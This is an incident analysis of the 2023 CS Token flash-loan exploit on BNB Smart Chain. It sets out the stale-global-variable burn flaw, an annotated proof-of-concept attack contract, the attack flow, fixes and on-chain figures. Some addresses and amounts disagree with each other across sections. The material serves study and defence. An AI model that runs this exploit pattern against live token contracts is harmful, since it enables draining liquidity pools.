# CS Token — Business Logic Flaw Analysis Based on Global Variable Misuse

| Item | Details |
|------|------|
| **Date** | 2023-05-23 |
| **Protocol** | CS Token |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$714,285 BUSD (on-chain confirmed: 714,285.0018 BUSD) |
| **Attacker EOA** | [0x2cDE...27BA](https://bscscan.com/address/0x2cDEee9698fFc9fCAbc116b820C24E89184027BA) |
| **Attack Contract** | [0x90Fa...2e3](https://bscscan.com/address/0x90Fa57D23b85cdD52C46b85636f44c47926ee2e3) |
| **Vulnerable Contract (CS Token)** | [0x8BC6...15e](https://bscscan.com/address/0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e) |
| **Attack Tx** | [0x9063...aa4](https://bscscan.com/tx/0x906394b2ee093720955a7d55bff1666f6cf6239e46bea8af99d6352b9687baa4) |
| **Attack Block** | 28,466,977 |
| **Root Cause** | Excessive LP burn using outdated global variable `sellAmount` — business logic flaw |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/CS_exp.sol) |
| **Analysis Reference** | [BlockSecTeam](https://twitter.com/BlockSecTeam/status/1661098394130198528) · [numencyber](https://twitter.com/numencyber/status/1661207123102167041) |

---

## 1. Vulnerability Overview

The CS Token protocol suffered approximately $714,285 in losses on May 23, 2023, from an attack exploiting a business logic flaw caused by the improper design of the global state variable `sellAmount`.

CS Token implements a deflationary mechanism that burns a portion of the pair's CS balance on every sell transaction. However, the `sellAmount` variable used to calculate the burn amount is declared as a **contract-level global state variable rather than transaction-local**, causing the value set in a previous transaction to persist (contaminate) until the next `sync()` call.

The attacker exploited this flaw as follows:

1. Borrowed 80,000,000 BUSD via a PancakeSwap flash loan
2. Accumulated 495,000 CS tokens through 99 repeated swaps — contaminating the `sellAmount` global variable with a large value
3. Forced a `sync()` trigger via a dummy `CS.transfer(address(this), 2)` call
4. `sync()` executed an excessive CS burn from the LP pool based on the **stale large `sellAmount`** rather than the current sell
5. Decreased CS reserve in the LP pool caused CS price to rise → sold accumulated CS at a favorable price

As a result, **398,733 CS was excessively burned to the burn address** from the LP pool during the attack, and the attacker netted **714,285 BUSD in profit** after repaying the flash loan fee (240,000 BUSD).

---

## 2. Vulnerable Code Analysis

### 2.1 `sellAmount` Global Variable Misuse (Core Vulnerability)

The CS Token contract uses the following structure for its burn mechanism.

**Vulnerable code (reconstructed):**
```solidity
// ❌ Vulnerability: sellAmount declared as permanent contract state, not transaction-scoped
uint256 public sellAmount;                              // ❌ Global state variable
uint256 public totalBurnAmount = 0;
uint256 public maxBurnAmount = 90_000_000 * 10 ** 18;  // Burn cap: 90M CS

// Inside _transfer() — on sell transactions
function _transfer(address from, address to, uint256 amount) internal {
    // ... omitted ...

    // ❌ Problem: overwrites global sellAmount on every sell
    // The previous sell's sellAmount can persist until the next sync() call
    if (takeSellFee) {
        sellAmount = amount;  // ❌ Global state mutation
    }

    // sync() trigger condition: also triggered when CS transfers to itself
    bool canSell = sellAmount >= 1;
    if (canSell && from != address(this) && from != uniswapV2Pair
            && from != owner() && to != owner() && !_isLiquidity(from, to)) {
        sync();  // ❌ Can execute with contaminated sellAmount unrelated to current transaction
    }
}

// sync() — burns CS from the LP pool
function sync() private lockTheSync {
    if (totalBurnAmount >= maxBurnAmount) {
        return;
    }
    // ❌ Core vulnerability: uses global sellAmount, not the current sell amount
    // Even a dummy call like CS.transfer(address(this), 2) uses this stale value
    uint256 burnAmount = sellAmount.mul(800).div(1000);  // ❌ Outdated value
    sellAmount = 0;  // Resets, but calculation already used the contaminated value

    if (totalBurnAmount + burnAmount > maxBurnAmount) {
        burnAmount = maxBurnAmount - totalBurnAmount;
    }
    if (_tOwned[uniswapV2Pair] > burnAmount) {
        totalBurnAmount += burnAmount;
        _tOwned[uniswapV2Pair] -= burnAmount;           // ❌ Force-burns CS from LP pool
        _tOwned[address(burnAddress)] += burnAmount;
        emit Transfer(uniswapV2Pair, address(burnAddress), burnAmount);
        // Update pair reserves (price changes)
        IUniswapV2Pair(uniswapV2Pair).sync();
    }
}
```

**Fixed code:**
```solidity
// ✅ Fix 1: Treat sellAmount as a local variable — prevent global state contamination
function _transfer(address from, address to, uint256 amount) internal {
    // ... omitted ...

    if (takeSellFee) {
        // ✅ Call sync() directly, passing amount as a parameter
        _syncBurn(amount);
    }
}

// ✅ Fix 2: Modify sync function to use only the current transaction's amount
function _syncBurn(uint256 currentSellAmount) private lockTheSync {
    if (totalBurnAmount >= maxBurnAmount) {
        return;
    }
    // ✅ Use parameter instead of global variable
    uint256 burnAmount = currentSellAmount.mul(800).div(1000);

    if (totalBurnAmount + burnAmount > maxBurnAmount) {
        burnAmount = maxBurnAmount - totalBurnAmount;
    }
    if (_tOwned[uniswapV2Pair] > burnAmount) {
        totalBurnAmount += burnAmount;
        _tOwned[uniswapV2Pair] -= burnAmount;
        _tOwned[address(burnAddress)] += burnAmount;
        emit Transfer(uniswapV2Pair, address(burnAddress), burnAmount);
        IUniswapV2Pair(uniswapV2Pair).sync();
    }
}
```

**The problem**: The `sellAmount` global variable is updated on every sell transaction but an outdated value can persist when a burn does not occur immediately. If an attacker deliberately calls a dummy `transfer` to trigger `sync()`, the LP pool is burned based on the previously set large value rather than the actual current sell amount, causing abnormal price manipulation.

---

### 2.2 Overly Permissive `sync()` Trigger Condition

**Vulnerable code (reconstructed):**
```solidity
// ❌ Vulnerability: sync() can be triggered by a dummy transfer(self, 2)
// When CS.transfer(address(this), 2) is called:
//   - from = attack contract
//   - to = attack contract (address(this))
//   - Condition: from != uniswapV2Pair, from != owner() → sync() executes!
bool canSell = sellAmount >= 1;
if (canSell
    && from != address(this)    // ❌ Passes if from is not self
    && from != uniswapV2Pair
    && from != owner()
    && to != owner()
    && !_isLiquidity(from, to)) {
    sync();                     // ❌ Can be maliciously triggered
}
```

**Fixed code:**
```solidity
// ✅ Fix: Make sync() non-externally-triggerable — call only within sell transactions
// Execute only within the takeSellFee condition using the _syncBurn() approach above
// Remove the separate syncable condition block
```

---

## 3. Attack Flow

### 3.1 Pre-Attack State (Block 28,466,976)

| Item | Value |
|------|-----|
| CS/BUSD pair CS reserve | 1,772,966.66 CS |
| CS/BUSD pair BUSD reserve | 2,818,575.49 BUSD |
| CS price | ~1.5898 BUSD/CS |
| sellAmount (global) | 166.17 CS (residual value from previous transaction) |
| totalBurnAmount | 262,246.35 CS (cumulative burns) |
| maxBurnAmount | 90,000,000 CS |

### 3.2 Execution Steps

```
┌─────────────────────────────────────────────────┐
│  Attacker EOA: 0x2cDE...27BA                     │
│  Deploy attack contract, call testExp()          │
└───────────────────┬─────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────┐
│  [Step 1] PancakeSwap Flash Loan                 │
│  pair.swap(80,000,000 BUSD, 0, attacker, "123") │
│  → Flash loan callback: pancakeCall() executes   │
│  Borrow 80,000,000 BUSD                         │
└───────────────────┬─────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────┐
│  [Step 2] Repeated Buy — 99-iteration loop       │
│  swapTokensForExactTokens(5,000 CS) × 99        │
│  BUSD → CS swap (buy exactly 5,000 CS each time)│
│  Total acquired: 495,000 CS                     │
│  Side effect: each swap's CS transfer runs       │
│  _transfer() → sellAmount global variable        │
│  contamination occurs                            │
└───────────────────┬─────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────┐
│  [Step 3] Swap all remaining BUSD               │
│  swapExactTokensForTokensSupportingFeeOnTransfer │
│  (remaining_BUSD → CS → address 0x382e96...)    │
│  → sellAmount set to a large value              │
│    (contamination complete)                      │
└───────────────────┬─────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────┐
│  [Step 4] Repeated sell + forced sync() trigger  │
│  while (CS balance >= 3,000 CS):                 │
│    swapExactTokensForTokensSupportingFeeOnTransfer│
│    (3,000 CS → BUSD, attacker)                  │
│    CS.transfer(address(this), 2)  ← Key!        │
│    → _transfer() executes                        │
│    → sync() called (based on outdated sellAmount)│
│    → 2,400+ CS burned from LP pool              │
│    → Pair reserve decreases → CS price rises    │
│  165 iterations, total burned: 398,733 CS       │
└───────────────────┬─────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────┐
│  [Step 5] Flash loan repayment and profit taking │
│  BUSD.transfer(pair, 80,240,000)  [incl. fee]   │
│  BUSD.transfer(EOA, 714,285.0018) [net profit]  │
└─────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Value |
|------|-----|
| Flash loan borrowed | 80,000,000 BUSD |
| Flash loan repaid | 80,240,000 BUSD (fee: 240,000 BUSD) |
| LP pool excessive CS burned | 398,733 CS |
| Attacker net profit | **714,285.0018 BUSD (~$714,285)** |
| Transfer events during attack | 3,592 log entries (1,621 Transfer events) |

---

## 4. PoC Code (DeFiHackLabs Key Excerpt)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @Analysis Reference
// https://twitter.com/BlockSecTeam/status/1661098394130198528
// @Attack Tx
// https://bscscan.com/tx/0x906394b2ee093720955a7d55bff1666f6cf6239e46bea8af99d6352b9687baa4
// @Vulnerability Summary
// Global variable sellAmount reused in burnAmount calculation — outdated value misuse

contract CSExp is Test, IPancakeCallee {
    // CS/BUSD PancakeSwap V2 pair
    IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 CS = IERC20(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e);

    function setUp() public {
        // Fork to just before the attack block
        cheats.createSelectFork("bsc", 28_466_976);
    }

    function testExp() external {
        // [Step 1] Flash loan request: 80M BUSD
        pair.swap(80_000_000 ether, 0, address(this), bytes("123"));
    }

    function pancakeCall(
        address sender, uint256 amount0, uint256 amount1, bytes calldata data
    ) external {
        require(msg.sender == address(pair));

        // [Step 2] Approve all BUSD to Router
        BUSD.approve(address(router), BUSD.balanceOf(address(this)));

        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(CS);

        // [Step 3] 99-iteration repeated buy: purchase exactly 5,000 CS each time
        // → _transfer() executes on each swap → sellAmount global variable contaminated
        for (uint256 i = 0; i < 99; ++i) {
            router.swapTokensForExactTokens(
                5000 ether,                         // Buy exactly 5,000 CS
                BUSD.balanceOf(address(this)),      // Max BUSD to spend
                path,
                address(this),
                block.timestamp + 1000
            );
        }

        // [Step 4] Swap all remaining BUSD (to a specific address)
        // → Sets sellAmount to a large value (contamination complete)
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BUSD.balanceOf(address(this)),
            1,
            path,
            0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5,  // Specific recipient address
            block.timestamp + 1000
        );

        // [Step 5] Repeated CS → BUSD sell
        CS.approve(address(router), CS.balanceOf(address(this)));
        path[0] = address(CS);
        path[1] = address(BUSD);

        while (CS.balanceOf(address(this)) >= 3000 ether) {
            // Swap 3,000 CS to BUSD
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                3000 ether,
                1,
                path,
                address(this),
                block.timestamp + 1000
            );
            // ← Core attack vector: dummy transfer(self, 2)
            // Executes _transfer() → triggers sync()
            // sync() burns LP based on outdated sellAmount, not current 3,000 CS
            CS.transfer(address(this), 2);
        }

        // [Step 6] Flash loan repayment (including fee)
        // Principal 80M + 0.3% fee = 80,240,000 BUSD
        BUSD.transfer(msg.sender, 80_240_000 ether);
        // Remaining profit transferred to EOA (received in testExp() after pancakeCall returns)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Global state variable `sellAmount` contamination (Outdated State Variable) | CRITICAL | CWE-362: Race Condition / CWE-672: Operation on a Resource After Expiration |
| V-02 | `sync()` function allows external triggering (Unprotected Sync Trigger) | HIGH | CWE-284: Improper Access Control |
| V-03 | Price manipulation combined with flash loan (Flash Loan Price Manipulation) | HIGH | CWE-682: Incorrect Calculation |

### V-01: Global Variable `sellAmount` Contamination

- **Description**: `sellAmount` is a global state variable updated on every sell transaction and used to calculate burn amounts. This variable can become "outdated," referencing a value from a previous transaction rather than the current one. The attacker sets this variable to a high value via large swaps, then intentionally triggers `sync()` with a dummy transfer, burning more CS from the LP pool than expected.
- **Impact**: Excessive reduction of CS reserve in the LP pool artificially inflates CS price, allowing the attacker to profit by selling CS bought at a low price at a higher price
- **Attack Conditions**: Flash loan access, understanding of CS token's transfer/sync mechanism

### V-02: `sync()` Function Allows External Triggering

- **Description**: The `sync()` call condition within `_transfer()` can be satisfied by ordinary token transfers (including transfers to oneself), allowing an attacker to intentionally activate the burn mechanism with an extremely small dummy transfer such as `CS.transfer(address(this), 2)`.
- **Impact**: Abnormal repeated triggering of the burn mechanism, manipulating LP pool reserves
- **Attack Conditions**: Analysis of contract code to identify sync() trigger conditions

### V-03: Price Manipulation Combined with Flash Loan

- **Description**: After borrowing large amounts of BUSD via a flash loan, the attacker manipulates `sellAmount` through repeated small buys, then inflates the price through LP burns. Without the flash loan, capital constraints would have limited the attack's effectiveness.
- **Impact**: 714,285 BUSD profit realized within a single transaction
- **Attack Conditions**: PancakeSwap flash loan access, sufficient gas (~4,854,547 gas used)

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Remove sellAmount global variable, pass amount directly to sync()
// Before
uint256 public sellAmount;  // ❌ Risk of global state contamination

// After: Remove or declare private and use only within the same transaction scope

// _transfer() modification
function _transfer(address from, address to, uint256 amount) internal {
    // ...
    if (takeSellFee) {
        // ✅ Pass current amount directly instead of sellAmount global variable
        _performBurn(amount);
    }
    // ✅ Remove separate canSell condition block
}

// ✅ Fix 2: Change sync() to internal only and accept amount parameter
function _performBurn(uint256 sellAmt) private {
    if (totalBurnAmount >= maxBurnAmount) return;
    uint256 burnAmount = sellAmt * 800 / 1000;  // ✅ Based on current transaction
    // ...
}
```

```solidity
// ✅ Fix 3: Prevent sync() triggering via dummy transfers
// Add minimum amount check to sync call condition within _transfer()
function _transfer(address from, address to, uint256 amount) internal {
    // ...
    // ✅ Execute burn only on sells of at least a meaningful minimum amount
    if (takeSellFee && amount >= MINIMUM_SELL_THRESHOLD) {
        _performBurn(amount);
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Global state variable contamination | Handle burn-related state as transaction-local stack variables. Or declare `sellAmount` as `private` and use only within the same function scope |
| sync() external triggering | Call burn logic directly from the sell branch within `_transfer()` only; completely remove the conditional external trigger block |
| Flash loan manipulation | Set a per-call burn cap relative to LP pool state changes. Add TWAP-based price verification |
| Repeated burns in a single TX | Limit sync() call frequency per block or per address (e.g., `lastSyncBlock[tx.origin] == block.number` check) |
| Contract pause | Implement Emergency Pause functionality — enable halting the burn mechanism upon detection of anomalous patterns |

---

## 7. Lessons Learned

1. **Global state variables can be contaminated across transaction boundaries**: The "temporal coupling" pattern — where a global variable set in a previous transaction is incorrectly used in the current context — is particularly dangerous in DeFi. Values used in calculations should be handled as function parameters or local variables whenever possible.

2. **Burn/mint mechanisms must not be externally triggerable**: If the conditions that activate token economic mechanisms (burn, mint, reward distribution) can be satisfied by dummy transfers or arbitrary external calls, attackers will leverage this. Core mechanisms must be accessible only via explicit `onlyOwner`, `nonReentrant`, or internal (`private`) functions.

3. **The combination of fee-on-transfer tokens and flash loans is always dangerous**: Tokens that execute additional logic on transfer (burns, swaps, etc.) are vulnerable to unexpected price manipulation when combined with flash loans. Any calculation that depends on spot prices within an AMM must be supplemented with TWAP.

4. **Prevent state triggering via dummy (micro) transfers**: Side effects (burns, reward distributions, etc.) that execute regardless of transfer amount without an `amount >= threshold` check can be exploited with negligible-value transfers.

5. **BSC's low-cost environment facilitates repeated attacks**: BSC's low gas costs make hundreds of repeated swaps/transfers economically feasible within a single transaction. Exploitable vulnerabilities are far easier to abuse on BSC than on Ethereum.

---

## 8. On-Chain Verification

On-chain verification was performed using `cast` (Foundry) on BSC mainnet (blocks 28,466,976–28,466,977).

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash loan borrowed | 80,000,000 BUSD | 80,000,000 BUSD | ✅ |
| Flash loan repaid | 80,240,000 BUSD | 80,240,000 BUSD | ✅ |
| Attacker profit (EOA received) | ~$714,000 | **714,285.0018 BUSD** | ✅ |
| Total CS burned | Estimated | **398,732.9360 CS** | On-chain confirmed |
| Attacker CS acquired (99 swaps) | 495,000 CS | 495,000 CS | ✅ |
| Flash loan fee | 240,000 BUSD | 240,000 BUSD | ✅ |

### 8.2 On-Chain Event Log Sequence

```
1. Transfer (BUSD): pair → attack contract  [80,000,000 BUSD — flash loan]
2. Transfer (BUSD): attacker → CS/BUSD pair [3,158 BUSD — first swap]
3. Transfer (CS): pair → attack contract    [4,950 CS — swap received]
4. Transfer (CS): pair → dead address       [50 CS — transfer fee burn]
   ... (pattern 2-4 repeated 99 times) ...
5. Transfer (BUSD): attacker → specific address  [all remaining BUSD]
   [sellAmount set to large value]
6. Transfer (CS): attacker → pair           [3,000 CS — first reverse swap]
7. Transfer (CS): attacker → attacker (dummy, 2 wei) → sync() triggered
8. Transfer (CS): pair → dead address       [excessive burn executed]
   ... (pattern 6-8 repeated 165 times) ...
9. Transfer (BUSD): pair → attack contract  [14,893 BUSD — last reverse swap]
10. Transfer (BUSD): attacker → pair        [80,240,000 BUSD — flash loan repayment]
11. Transfer (BUSD): attacker → EOA         [714,285.0018 BUSD — final profit received]
```

**Total events**: 3,592 log entries, 1,621 Transfer events

### 8.3 Precondition Verification (At Attack Block 28,466,976)

| Item | Value | Notes |
|------|-----|-----|
| `sellAmount` (global) | 166.17 CS | Residual value from previous transaction — already contaminated before attack |
| `totalBurnAmount` | 262,246.35 CS | Cumulative burns |
| `maxBurnAmount` | 90,000,000 CS | Burn cap |
| CS/BUSD pair CS reserve | 1,772,966.66 CS | |
| CS/BUSD pair BUSD reserve | 2,818,575.49 BUSD | |
| CS spot price | ~1.5898 BUSD/CS | Pre-attack baseline |
| `uniswapV2Pair` (contract return) | 0x6BC2823D...107a1 | CS/BUSD pair address confirmed |

> **Note**: The fact that `sellAmount` was set to 166.17 CS — not zero — even immediately before the attack transaction indicates that this global variable was continuously in a contaminated state during normal operation. The attacker exploited this by contaminating it with an even larger value, then repeatedly triggering `sync()`.